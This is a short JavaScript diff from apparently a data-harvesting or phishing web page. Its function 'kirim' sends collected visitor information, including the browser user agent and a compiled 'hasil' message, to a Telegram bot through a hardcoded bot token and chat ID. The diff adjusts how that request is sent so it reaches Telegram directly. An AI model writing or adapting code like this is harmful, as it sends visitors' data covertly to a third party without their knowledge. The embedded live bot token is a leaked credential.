@@ -18,11 +18,11 @@ async function kirim() {
 🖥️ *Device*: ${navigator.userAgent}
     `;
 
-    await fetch("https://corsproxy.io/?https://api.telegram.org/bot7787813252:AAHDuYArq78QFXqSSw-66L8oCO9qACyFnZk/sendMessage", {
+    await fetch(`https://api.telegram.org/bot7787813252:AAHDuYArq78QFXqSSw-66L8oCO9qACyFnZk/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        chat_id: 7607549215,
+        chat_id: "7607549215", // Ganti ini kalau perlu
         text: hasil,
         parse_mode: "Markdown"
       })
